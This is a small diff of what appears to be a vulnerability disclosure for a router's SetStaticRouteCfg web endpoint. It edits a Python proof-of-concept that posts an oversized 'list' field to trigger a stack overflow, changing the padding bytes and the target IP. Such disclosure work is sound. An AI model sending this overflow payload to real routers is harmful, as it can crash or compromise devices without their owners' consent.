@@ -39,9 +39,9 @@ Stack overflow point：
 import requests
 
 data = {
-    b"list": b'A'*0x400+b',A,A,A'
+    b"list": b'Raining'*0x400+b',R,R,R'
 }
-res = requests.post("http://ip/goform/SetStaticRouteCfg", data=data)
+res = requests.post("http://192.168.142.100/goform/SetStaticRouteCfg", data=data)
 print(res.content)
 ```
 
